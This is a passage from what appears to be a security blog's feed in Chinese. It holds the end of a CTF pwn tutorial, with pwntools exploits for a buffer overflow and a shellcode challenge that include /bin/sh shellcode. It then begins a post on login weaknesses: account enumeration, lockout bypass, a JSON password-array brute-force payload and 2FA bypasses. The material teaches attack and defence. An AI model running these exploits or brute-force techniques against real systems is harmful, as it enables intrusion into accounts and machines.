class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'DEBUG'</span><br><br>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./retcheck'</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">#p= remote('challenge.ctf.games', 31463)</span><br><br>retaddr <span class=\"token operator\">=</span> <span class=\"token number\">0x401465</span><br>win <span class=\"token operator\">=</span> <span class=\"token number\">0x4012e9</span><br><br>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">408</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>retaddr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'B'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>win<span class=\"token punctuation\">)</span><br><br>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>local 隨便創一個 flag.txt 來試試看，成功印出 flag！</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-flag.png\" /><figcaption><p>flag</p>\n</figcaption></figure></p>\n<h2 id=\"simple-shellcode---shellcoded\"><a class=\"direct-link\" href=\"#simple-shellcode---shellcoded\">#</a> Simple shellcode - shellcoded</h2>\n<p>再來我們看個經典的 shellcode 題，題目你可以在<a href=\"https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/shellcoded\">這裡</a>下載。</p>\n<p>shellcode 基本上就是可以直接執行、由組語指令轉成的一系列的 machine code。因為需要可寫與可執行的記憶體空間，這個技巧常用於 process injection 到沒有 NX 保護的檔案裡，可以輕鬆做到 RCE。</p>\n<p>跑來跟剛剛類似，也是請你輸入一些東西，但這裡馬上就噴出了一個 segfault。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/shellcoded-run.png\" /><figcaption><p>running shellcoded</p>\n</figcaption></figure></p>\n<p>發生什麼事了呢？這次我們用另一個很棒的<s>懶人</s>工具看看： Ghidra。Ghidra 是 NSA 開發的 reverse 工具，最爽的地方是可以讓買不起 IDA Pro 的人用 decompile 的功能，雖然不可能百分百還原（而且有時候 assembly 還好懂一點），但 Ghidra 還是我搭配 gdb 或 radare2 動態執行時常用的好夥伴。</p>\n<p>跑起來大概會長這樣：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/shellcoded-ghidra.png\" /><figcaption><p>shellcoded Ghidra</p>\n</figcaption></figure></p>\n<p>程式碼的部分整理一下，加一些註解跟換變數名稱，會長這樣：</p>\n<pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">char</span> cVar1<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">int</span> mem_perm_result<span class=\"token punctuation\">;</span><br>    code <span class=\"token operator\">*</span>__buf<span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">size_t</span> buf_size<span class=\"token punctuation\">;</span><br>    uint count<span class=\"token punctuation\">;</span><br>    <br>    <span class=\"token comment\">// allocate memory for buffer</span><br>    __buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>code <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">aligned_alloc</span><span class=\"token punctuation\">(</span>PAGE_SIZE<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>__buf <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>code <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to allocate memory.\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1b</span><span class=\"token punctuation\">,</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <br>    <span class=\"token comment\">// read shellcode from user</span><br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your shellcode.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    buf_size <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>__buf<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;</span> buf_size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>        <span class=\"token comment\">// process shellcode</span><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>count <span class=\"token operator\">&lt;</span> buf_size<span class=\"token punctuation\">;</span> count <span class=\"token operator\">=</span> count <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                cVar1 <span class=\"token operator\">=</span> <span class=\"token string\">'\\x01'</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>                cVar1 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            __buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>count<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>__buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>count<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>count <span class=\"token operator\">*</span> cVar1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token comment\">// set execute permissions</span><br>        mem_perm_result <span class=\"token operator\">=</span> <span class=\"token function\">mprotect</span><span class=\"token punctuation\">(</span>__buf<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mem_perm_result <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>__buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to set memory permissions.\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token comment\">// run shellcode</span><br>        <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>__buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>__buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這次沒有任何需要 overflow 的地方，也跟 memory protection 沒什麼關係，因為程式會跟我們要輸入然後直接執行，所以我們只要確保輸入的 shellcode 沒問題就可以了。</p>\n<h3 id=\"how-to-generate-shellcode%3F\"><a class=\"direct-link\" href=\"#how-to-generate-shellcode%3F\">#</a> how to generate shellcode?</h3>\n<p>要產生 shellcode 有三種方式：自己寫、用工具產、上網找。</p>\n<p>最扎實的方式是自己寫，你可以先用 c 把程式寫出來，然後把編譯完的結果 copy paste，或是直接用組語寫，然後用 <code>nasm</code> 轉換。教學文網路上很多，這裡附上我自己覺得滿好懂的文章：<a href=\"https://www.vividmachines.com/shellcode/shellcode.html\">Shellcoding for Linux and Windows Tutorial</a></p>\n<p>用工具產也是很常用的方法，最方便的是用 metasploit 的 msfvenom，好處是你可以控制一些參數（例如 reverse shell 要用的 IP 跟 port）跟彈性（例如加上一些 encoding 來規避防毒或是躲過 WAF），但又可以保有自動化的特性。</p>\n<p>當然，上網找也是一個方法。最常用的線上資源大概就是 <a href=\"http://shell-storm.org/shellcode/\">shellstorm</a> 跟 <a href=\"https://www.exploit-db.com/shellcodes\">ExploitDB</a> 這兩個地方，收藏了各種 architecture、功能、長度的 shellcode。如果不用任何客製化，例如只是要做到 local 開 shell 或是讀取 flag.txt 等固定功能，在上面應該可以輕鬆找到可以直接用的 shellcode。</p>\n<p>這題我從 shellstorm 選了一個非常短的 payload：<a href=\"http://shell-storm.org/shellcode/files/shellcode-905.php\">x86_64 execveat(&quot;/bin//sh&quot;) 29 bytes shellcode</a>，當然這不是唯一會成功的，你可以選別的自己試試看，然後嘗試 local debug 判斷為什麼有些會成功有些會失敗。</p>\n<h3 id=\"bypass-obfuscation\"><a class=\"direct-link\" href=\"#bypass-obfuscation\">#</a> bypass obfuscation</h3>\n<p>有了 shellcode 之後，就可以來看看中間 processing 的部分了。</p>\n<p><code>if ((count &amp; 1) == 0)</code> 就是判斷 count 的奇偶，最後一個 bit 是 1 的話（奇數）<code>cVar1 = -1</code>，最後一個 bit 是 0 的話（偶數）<code>cVar1 = 1</code>。這個 count 的奇偶性質會被用來 in place 修改輸入的資訊：<code>__buf[count] = (__buf[count] + count * cVar1);</code>，也就是說把每一個字元用 16 進位表示法作運算，第 0 個 +0，第 1 個 -1，第 2 個 +2，第 3 個 -3⋯⋯ 更動每一個輸入。</p>\n<p>你可以把原本的 shellcode 輸入進去，然後在 processing 結束的地方設一個中斷點，看一下兩者之間的差別，就可以清楚看出邏輯了。從 6a 開始，下一個從 0x42 變成 0x41，0x58 變成 0x5a，直到最後 0x05 被 +28 變成 0x21：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\"># original shellcode<br>#0x559a4fc78000:\t0x529948c4fe58426a\t0x2f2f6e69622fbf48<br>#0x559a4fc78010:\t0xd089495e54576873\t0x00000a 050fd28949<br><br># modified shellcode<br>#                      - + - + - + - +     - + - + - + - +<br>#0x559a4fc78000:\t0x4b9f43c8fb5a416a\t0x203d61755739b650<br>#0x559a4fc78010:\t0xb99f347241695783\t0x0000ed 21f4ec7061</code></pre>\n<p>所以我們只要在送出 shellcode 前反向操作，把加減處理好，送過去之後程式就會把它還原成我們的 shellcode 了。用 pwntools 寫的 exploit 如下（要特別注意的是 overflow 和 underflow 的處理）：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span><br><br><span class=\"token comment\">#p = process('./shellcoded')</span><br>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'challenge.ctf.games'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32383</span><span class=\"token punctuation\">)</span><br><br>sc <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05'</span><br><br>new_sc <span class=\"token operator\">=</span> <span class=\"token string\">''</span><br><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">if</span> i<span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        m <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>        m <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><br>    v <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> m<span class=\"token operator\">*</span>i<br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> v<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        new_sc <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">elif</span> v<span class=\"token operator\">></span><span class=\"token number\">255</span><span class=\"token punctuation\">:</span><br>        new_sc <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v<span class=\"token operator\">-</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>\t    new_sc <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><br><br>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>new_sc<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>做 binary exploitation 的喜歡 segmentation fault 就跟做 web 的喜歡 500 internal server error 差不多，只要可以讓程式出現非預期的錯誤就有希望 XDDD</p>\n<p>雖然到目前為止介紹的都還是 pwn 中最粗淺的皮毛，但希望多少有勾起大家的興趣，讓大家從記憶體的角度出發想想自己寫的程式碼如何運作，發出『哦原來是這樣的呀』的感嘆。</p>\n<p>下一篇我們再來探討 pwn 中最常聽到的 ROP 是如何運作的，gadget 是什麼，以及如何構造進階一些的 exploit。</p>\n",
      "date_published": "2021-09-29T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/authentication/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/authentication/",
      "title": "被盜帳號是誰的錯？聊聊 Authentication",
      "content_html": "<!-- summary -->\n<p>『身份驗證機制遭破解』聽起來很技術，但『盜帳號』大家應該就都很有感了。沒錯，盜帳號不只是朋友之間惡搞的玩笑，而是真實世界駭客入侵手法最大宗沒有之一。那麼，被盜帳號是誰的錯呢？</p>\n<!-- summary -->\n<p>先想想你都怎麼盜朋友帳號的吧。</p>\n<p>有可能是趁他去上廁所的時候偷發文，也有可能是他用學校電腦卻忘了登出，更有可能的是『啊他就萬年一組帳號啊，不就是名字加生日嘛』。</p>\n<p>沒錯，使用弱密碼的確是帳號被破解最大的原因之一。弱密碼不只是 qwerty monkey iloveyou 這種隨便一個字典檔就可以在半小時內爆開的常見字串，還包含跟個資相關，用名字、生日、電話、親朋好友的資訊組合而成的字串。就算你在前後多加一個驚嘆號或數字，對駭客來說也只是多花一分鐘就能破解的。而一旦破獲一組帳密，你的多個帳號大概也跟著淪陷了，畢竟，大多數人都是一兩組密碼打天下而且從來不更換的，就算會換也通常有某種規律，例如從 iamhappy1 變 iamhappy12 再到 iamhappy123。</p>\n<p><figure><img src=\"https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2014/11/social-media-account-hacked.jpg\" /><figcaption><p>image from <a href=\"https://www.avira.com/en/blog/hacked-social-media-account\">Avira</a></p>\n</figcaption></figure></p>\n<p>你可能覺得，駭客哪會這麼了解我？的確，駭客可能不『認識』你，但別忘了，你在社群軟體上的貼文留言、你的朋友清單、你在別的網站或問券上無意留下的資料，全都是駭客秘密搜集的拼圖碎片！有了這麼多數位足跡，要知道你的出生年月日、國小國中高中學號、常去的店跟要好的朋友，可是易如反掌呢！</p>\n<p>但如果不讓你用這些跟你相關的資訊，要求你每個登入頁面都要用完全不同的 10 位亂數當密碼，你記得住嗎？</p>\n<p>根據密碼管理軟體 <a href=\"https://www.techradar.com/reviews/nordpass\">NordPass</a> 統計，一個人平均有 100 組密碼。也就是說，在不使用密碼管理軟體的情況下，你必須腦袋裡牢牢記住 100 個毫不相干的 10 位亂數。而就算你使用了密碼管理軟體來儲存這 100 個亂數，如果你的 master password 本身還是弱密碼，那駭客只要破解它就可以獲得你全部的密碼了。</p>\n<p>可見對大多數人來說，完全不使用弱密碼顯然不是可行的做法。那我們還能從哪裡防止『盜帳號』呢？</p>\n<blockquote>\n<p>回想前面的情境，會發生『被盜帳號』通常是因為使用了能被預測跟列舉嘗試的密碼，既然難以杜絕『被預測』的可能，我們至少可以往『被列舉嘗試』這邊防堵。<br>\n如果攻擊者沒辦法透過登入頁面的反應來知道攻擊是否成功，或是只有少少的幾次機會可以嘗試，那只要密碼不是最直覺最好猜的那幾組就能暫時躲過一劫。</p>\n</blockquote>\n<p>注意，這裡說的暫時是指駭客沒辦法非常快速輕鬆的破解你的密碼，但如果你在多個服務都重複使用同一組密碼，那只要有夠多網站就會累積夠多機會讓駭客多花一點時間撞到正確的那一組！</p>\n<p>作為開發者，該如何防範『帳號密碼被列舉嘗試』呢？讓我們看看一個經典範例。</p>\n<h2 id=\"%E9%96%8B%E7%99%BC%E8%80%85%E8%88%87%E9%A7%AD%E5%AE%A2%E7%9A%84%E8%A7%92%E5%8A%9B\"><a class=\"direct-link\" href=\"#%E9%96%8B%E7%99%BC%E8%80%85%E8%88%87%E9%A7%AD%E5%AE%A2%E7%9A%84%E8%A7%92%E5%8A%9B\">#</a> 開發者與駭客的角力</h2>\n<p>小明是個新手工程師，學成後興沖沖加入一個團隊開發電商平台，負責管理客戶登入跟設定的模組。不過半年，電商平台大獲好評，使用者每個月都以倍數成長，小明覺得錢途光明，非常有成就感。結果兩天後在新聞上看到：</p>\n<blockquote>\n<p>驚！知名電商平台洩漏大量個資！<br>\n傳出知名電商平台遭駭，竟有高達 300000 筆客戶資訊於暗網拋售，內容包含信用卡、消費紀錄等資訊，受害範圍遍佈歐洲亞洲等數十國家，其中不乏知名廠商。據相關人士於 twitter 透露，由於平台登入頁面存在弱點，駭客以暴力破解獲取多組帳密資訊，包含某管理員權限帳號，進而得以竊取大量個資。</p>\n</blockquote>\n<p>小明馬上找來長期接觸資安的好友阿柚諮詢，阿柚一看先問實作邏輯。小明非常困惑，不就是把使用者輸入的帳號拿去查一下資料庫，如果有這個使用者再去查一次密碼嗎？如果查無此使用者，畫面上就會顯示『帳號錯誤』，密碼不對就會顯示『密碼錯誤』，教學文章不都是這樣做的嗎？</p>\n<p>阿柚直搖頭，列出三大罪狀：</p>\n<ul>\n<li>先查帳號再查密碼</li>\n<li>錯誤訊息太明確</li>\n<li>沒有任何登入次數限制</li>\n</ul>\n<p>看著小明一臉問號，阿柚娓娓道來：</p>\n<h3 id=\"%E5%85%88%E6%9F%A5%E5%B8%B3%E8%99%9F%E5%86%8D%E6%9F%A5%E5%AF%86%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E5%85%88%E6%9F%A5%E5%B8%B3%E8%99%9F%E5%86%8D%E6%9F%A5%E5%AF%86%E7%A2%BC\">#</a> 先查帳號再查密碼</h3>\n<p>先查帳號再查密碼看似合理，畢竟這樣才能跟用戶說到底是哪一個打錯了嘛！但這個做法其實也透露給駭客：一個帳號存不存在，跟查幾次資料庫有關。而大家應該都知道查詢資料庫其實是很花時間的，所以在假設其他程式邏輯都相同的情況下，查兩次資料庫跟查一次應該有回覆速度上明顯的差異。</p>\n<p>因此，如果我拿一百個帳號去嘗試登入，結果發現其中一個頁面回覆的的時間是其他的兩倍，那我就可以推論，這個帳號既然用了兩次資料庫查詢，那他應該是存在的吧？</p>\n<p>利用這個瑕疵，駭客就可以拿一個很大的帳號名單逐一嘗試登入，然後透過回覆速度判斷資料庫裡面存在哪些帳號，再利用過濾完的帳號名單第二次暴力破解使用弱密碼的用戶。不出意外，小明用的後台管理帳號名稱就是最直觀的 admin，當然一下就被字典檔發現啦！</p>\n<h3 id=\"%E9%8C%AF%E8%AA%A4%E8%A8%8A%E6%81%AF%E5%A4%AA%E6%98%8E%E7%A2%BA\"><a class=\"direct-link\" href=\"#%E9%8C%AF%E8%AA%A4%E8%A8%8A%E6%81%AF%E5%A4%AA%E6%98%8E%E7%A2%BA\">#</a> 錯誤訊息太明確</h3>\n<p>小明惱了，debug message 不清不楚成何體統，使用者怎麼知道哪裡打錯？沒錯，當你把錯誤訊息寫得越精確，你輕鬆、使用者輕鬆、駭客更輕鬆。他甚至也不用管實作邏輯是不是會有回應速度上的差異，只要單純根據錯誤訊息就知道到底是帳號錯還是密碼錯，輕輕鬆鬆列舉所有的帳號！</p>\n<p>從資安的觀點來講，錯誤訊息應該盡可能籠統，例如任何登入錯誤都用『帳號密碼錯誤』或『您輸入的資訊有誤』帶過，讓駭客更難判斷攻擊是否成功。</p>\n<h3 id=\"%E6%B2%92%E6%9C%89%E4%BB%BB%E4%BD%95%E7%99%BB%E5%85%A5%E9%99%90%E5%88%B6\"><a class=\"direct-link\" href=\"#%E6%B2%92%E6%9C%89%E4%BB%BB%E4%BD%95%E7%99%BB%E5%85%A5%E9%99%90%E5%88%B6\">#</a> 沒有任何登入限制</h3>\n<p>最大的問題，就是沒有針對『嘗試登入』這個舉動做任何限制！因為任何人都可以輕易地對網站做無限多次的登入嘗試，概念上就像買樂透一樣，你把每一種可能的組合都包牌買下來總是會中大獎的吧？那為什麼我們還要努力工作，不能走進彩券行大手一揮全包下來？因為包牌的成本遠超過中獎的獎金，這個行為的期望值太低了，不值得我們這樣做。</p>\n<blockquote>\n<p>同理，對暴力破解來說，最根本的解決方法就是增加駭客的成本，讓他要花的時間跟資源大到暴力破解變得不可行，就能有效抵擋這種攻擊。</p>\n</blockquote>\n<p>聽了阿柚的解說，小明打開 log 一看，發現從一個 IP 12.34.56.78 發了將近百萬個登入的 request，瞬間恍然大悟『那我只要限制每個 IP 如果連續五次請求都打錯密碼就鎖帳號，這樣就可以了吧！』。</p>\n<p>阿柚想了想，再搖搖頭，這個做法還是有邏輯錯誤。</p>\n<h3 id=\"%E7%99%BB%E5%85%A5%E9%82%8F%E8%BC%AF%E9%8C%AF%E8%AA%A4\"><a class=\"direct-link\" href=\"#%E7%99%BB%E5%85%A5%E9%82%8F%E8%BC%AF%E9%8C%AF%E8%AA%A4\">#</a> 登入邏輯錯誤</h3>\n<p>因為鎖帳號的邏輯是『連續五次錯誤』，所以駭客可以先註冊一組帳號，然後每試四次就成功登入自己的帳號一次，打破『連續』的條件，這樣 4+1 的方法不斷重複一樣可以繞過小明的限制達到暴力破解。再者，如果是在帳號密碼分開查詢資料庫的實作下，駭客還可以用 4+1 搭配前面提過的時間判斷法來列舉平台上的帳號。因此以來源 IP 為判斷對象鎖帳號的邏輯其實無法阻止駭客的攻擊。</p>\n<p>而且眼尖的阿柚還發現，登入用的 POST 請求居然允許使用 JSON 格式的 post data：</p>\n<pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span><br>    <span class=\"token property\">\"username\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token property\">\"password\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"password\"</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這樣根本不用發大量請求，只要把大量的密碼們一次用 array 的方式送過去，如果裡面有一組正確的就可以直接登入啦！</p>\n<pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span><br>    <span class=\"token property\">\"username\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token property\">\"password\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><br>        <span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"pass123\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"iloveyou\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"letmein\"</span><br>        ...<br>    <span class=\"token punctuation\">]</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>小明沉思許久，要考慮的事情真多呀！不只要看登入格式，還要限制每個帳戶登入失敗幾次就要鎖住，而且錯誤訊息跟資料庫查詢方式都要調整，真是大工程。</p>\n<p>不過既然頭都洗下去了，不如再給他做個最近正流行的 2FA 吧！</p>\n<h3 id=\"2fa\"><a class=\"direct-link\" href=\"#2fa\">#</a> 2FA</h3>\n<p>2FA (2 factor authentication) 翻譯為雙因素驗證，也就是輸入正確的帳號密碼後還必須透過 email 或簡訊的方式再驗證一次，都過了才算登入成功。廣義來說為一種 MFA (multiple factor authentication)，或多因素驗證，為了防止單一驗證方法被破解而延伸的多層防線戰術。</p>\n<p>要做當然好，阿柚說，但實作上也是要多注意呀！</p>\n<p>先前新聞上（ <a href=\"https://news.thewindowsclub.com/hackers-could-bypass-cpanel-2fa-104264/\">Hackers could bypass cPanel 2FA in minutes using brute-force attacks</a> ）才報導軟體因為 2FA 驗證碼沒有限制提交的時間跟次數，導致駭客可以在幾分鐘內暴力破解僅 4 個數字組成的驗證碼。</p>\n<blockquote>\n<p>要做好 2FA 必須加上一些限制，例如驗證碼有效的時間不應過長、驗證碼應隨機無法預測、要求輸入錯誤三次就要重新傳送驗證碼等等。</p>\n</blockquote>\n<p>另外，輸入驗證碼後的 API 也應做好保護。例如曾有網站在驗證碼比對成功後對後端發送 <code>/auth/2fa?verify=true</code> 來表示驗證成功，或甚至直接跳轉 <code>/myaccount/</code> 進到登入後頁面，這時 API 邏輯根本與 2FA 無關，駭客根本可以忽略驗證碼，直接發同樣的 API 就可以登入啦！</p>\n<p>或是不久前 <a href=\"https://portswigger.net/daily-swig/researchers-trick-duo-2fa-into-sending-authentication-request-to-attacker-controlled-device\">Researchers trick Duo 2FA into sending authentication request to attacker-controlled device</a> 報導了 2FA 驗證時的 state 與當前嘗試登入的 session 無關，導致駭客可以用自己登入時 2FA 驗證的 state 取代正在嘗試破解的 2FA 驗證，導致系統誤以為受害者的裝置已接受驗證。</p>\n<p>本來的機制是：輸入帳號密碼後會觸發 2FA 驗證流程，首先會發送下圖中第一個請求 <code>POST /frame/prompt</code>，其中 <code>sid</code> 代表的是當前的 session id。這時伺服器會回傳 <code>txid</code>，讓網頁端可以持續查詢（poll） 2FA 驗證的狀態，例如是否已傳送通知、使用者驗證了沒等資訊，來判斷登入是否成功。在網頁首次請求 <code>POST /frame/status</code> 時，伺服器才會對使用者的手機發送推播通知，引導使用者進行第二次驗證。直到手機端點擊確認，伺服器更改了驗證狀態，網頁端才會在下一次查詢時得到 <code>txid</code> 狀態為 allow 的結果，完成驗證。</p>\n<p><figure><img src=\"/img/posts/crystal/authentication/duo-mechanism.png\" /><figcaption><p>Duo security app mechanism</p>\n</figcaption></figure></p>\n<p>那駭客是如何繞過的呢？</p>\n<p>問題出在辨識身份的 <code>sid</code> 跟辨識 2FA 驗證狀態的 <code>txid</code> 